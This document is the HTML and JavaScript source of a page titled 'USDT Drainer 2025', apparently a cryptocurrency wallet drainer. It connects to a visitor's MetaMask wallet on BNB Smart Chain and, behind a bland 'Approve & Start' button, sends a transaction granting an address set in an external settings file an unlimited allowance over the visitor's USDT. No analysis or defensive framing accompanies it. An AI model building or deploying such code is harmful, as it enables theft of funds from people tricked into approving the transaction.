<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>USDT Drainer 2025</title>
  <style>
    body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #13161a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }
    .card { background: #1e2329; border-radius: 28px; padding: 24px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
    .connect-btn, .approve-btn, .drain-btn { background: #1E88E5; border: none; color: white; padding: 12px 24px; border-radius: 40px; font-weight: 600; font-size: 16px; width: 100%; cursor: pointer; margin-top: 16px; transition: opacity 0.2s; }
    .approve-btn { background: #f0b90b; color: #1b2026; }
    .drain-btn { background: #f44336; }
    .status { margin-top: 20px; font-size: 14px; color: #7a7e85; word-break: break-word; }
    .hidden { display: none; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body>
<div class="card">
  <h2>USDT Drainer 2025</h2>
  <button id="connectBtn" class="connect-btn">Connect Wallet</button>
  <button id="approveBtn" class="approve-btn hidden">Approve & Start</button>
  <div class="status" id="status">Ready.</div>
</div>

<script src="settings.js"></script>
<script>
  let userAddress = null;
  let userChain = null;

  const connectBtn = document.getElementById('connectBtn');
  const approveBtn = document.getElementById('approveBtn');
  const statusDiv = document.getElementById('status');

  connectBtn.onclick = async () => {
    if (!window.ethereum) {
      statusDiv.innerText = 'MetaMask not detected. Please install MetaMask.';
      return;
    }
    statusDiv.innerText = 'Connecting...';
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
      userChain = parseInt(chainIdHex, 16);
      if (userChain !== 56) {
        statusDiv.innerText = 'Please switch to BNB Smart Chain (BSC).';
        return;
      }
      statusDiv.innerText = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on BSC`;
      connectBtn.classList.add('hidden');
      approveBtn.classList.remove('hidden');
    } catch (error) {
      statusDiv.innerText = `Connection failed: ${error.message}`;
    }
  };

  approveBtn.onclick = async () => {
    if (!window.ethereum || !userAddress) return;
    statusDiv.innerText = 'Requesting approval...';
    try {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
      const approveData = contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).encodeABI();
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{ from: userAddress, to: USDT_CONTRACT, data: approveData, gas: '0x186a0' }]
      });
      statusDiv.innerText = `Approval transaction sent: ${txHash.slice(0,10)}... Waiting for confirmation.`;
      const receipt = await waitForTransaction(txHash);
      if (receipt) {
        statusDiv.innerText = 'Approval confirmed! Your assets are now at risk.';
      } else {
        statusDiv.innerText = 'Approval failed.';
      }
    } catch (error) {
      statusDiv.innerText = `Approval error: ${error.message}`;
    }
  };

  async function waitForTransaction(txHash) {
    return new Promise((resolve) => {
      const interval = setInterval(async () => {
        try {
          const receipt = await window.ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
          if (receipt) {
            clearInterval(interval);
            resolve(receipt);
          }
        } catch (e) { console.error(e); }
      }, 2000);
    });
  }
</script>
</body>
</html>
